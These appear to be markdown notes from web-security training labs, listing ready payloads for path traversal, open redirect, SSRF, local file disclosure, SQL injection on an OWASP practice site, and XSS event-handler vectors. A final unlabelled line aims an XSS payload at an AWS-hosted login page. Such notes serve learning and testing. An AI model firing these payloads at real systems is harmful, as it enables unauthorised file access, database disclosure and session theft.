
# Web Attacks by Example


### LAB 1
1. Getting etc passwd (easy)
* `http://188.166.2.231:8185/challenge-1/?file=../../../../../etc/passwd`


2. Finding the test file
* `http://188.166.2.231:8185/challenge-2/?file=.././.././.././test`


3. Find etc passwd
* `http://188.166.2.231:8185/challenge-3/?file=hi.jpg/..././..././..././..././..././..././etc/passwd`



## Lab  Open  Redirect 
1. Redirect to a webpage
* `http://example.com/example.php?url=http://malicious.example.com`

2.  Redirect using redirect.php
* `http://167.99.32.124/test/redirect.php?url=https://google.com`


## LAB SSRF 

1. `http://188.166.2.231:8183/challenge-1/?url=http://127.0.0.1/admin.php`


2. Decode base64 image with a decoder (it is the admin page) 

* `http://188.166.2.231:8183/challenge-2/?url=http://127.0.0.1/admin.php/png`


3. Using tool xip.io && 127.0.1ANYTHING is blocked so use 127.1
 
* `http://188.166.2.231:8183/challenge-3/?url=http://127.1.0.1.xip.io/admin.php`



## Local File Disclossure  LAB

1. Getting etc passwd 
*    `http://167.99.32.124/test/?p=admin/download&file=..././..././..././etc/passwd%00txt`

     
     
 2. Uploading a PHP file disguised as a  png extension in the uploads folder
 *    `http://167.99.32.124/test/uploads/hack.png.ph`


## SQL Injections (SQLi)
The website used to practice is provided by *OWASP Vulnerable Web Applications Directory Project* (VWAD). It's a list of  known vulnerable web applications available for legal security and vulnerability testing. Meanining it's legal to practice hacking techniques on these sites!

The full lists of sites can be found here: https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project#tab=On-Line_apps

We will use: http://testphp.vulnweb.com for the sake of these examples

### Manual SQLi 

1. Bypassing password to login
* password: `bunnies' or '1'='1`

2. Testing if an SQL injection is possible:
* `http://testphp.vulnweb.com/listproducts.php?cat=1'`
* `http://testphp.vulnweb.com/listproducts.php?cat=1 order by 3--`

3. In case you have any doubts we actually are navigating through their SQL database note the error:
* `http://testphp.vulnweb.com/listproducts.php?cat=1 order by 12--`

4. Taking things further:
* * `http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,11`


5. View the hosting machine type:
* `http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,@@version,8,9,10,11`

6. Another way to disclose the identity of the locahost 
* `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,version(),current_user()`


### Ways to write XSS Code

* ` “><script>alert(document.cookie)</script>`

#### Anchor Tags
 if something like this present :
* `<a href=”myxsstestdmqlwp”>Click here ...</a>`

Trigger the anchor tag via the URL like this:

*  javascript:alert(1);
*  #”onclick=”javascript:alert(1)



#### Event Handlers
Numerous event handlers can be used with various tags to cause a script to execute. The following are some little-known examples that execute script without requiring any user interaction:

 * `<xml onreadystatechange=alert(1)> `
 * `<style onreadystatechange=alert(1)>`
 * `<iframe onreadystatechange=alert(1)>`
 
 * `<object onerror=alert(1)>`
 * `<object type=image src=valid.gif onreadystatechange=alert(1)></object>`
 * `<img type=image src=valid.gif onreadystatechange=alert(1)>   `            
 * `<input type=image src=valid.gif onreadystatechange=alert(1)>`
 * `<isindex type=image src=valid.gif onreadystatechange=alert(1)>`
 * `<script onreadystatechange=alert(1)>`
 * `<bgsound onpropertychange=alert(1)>`
 * `<body onbeforeactivate=alert(1)>`
 * `<body onactivate=alert(1)>`
 * `<body onfocusin=alert(1)>`

 #### HTML5 Event Handlers

 using autofocus to trigger actions 

 * `<input autofocus onfocus=alert(1)>`
 * `<input onblur=alert(1) autofocus><input autofocus>`
 * `<body onscroll=alert(1)><br><br>...<br><input autofocus>`

 Mouseover

 * `</a onmousemove=alert(1)>`


http://ec2-52-71-36-89.compute-1.amazonaws.com/issues/login_page.php'"/><input autofocus onfocus=alert(1)>
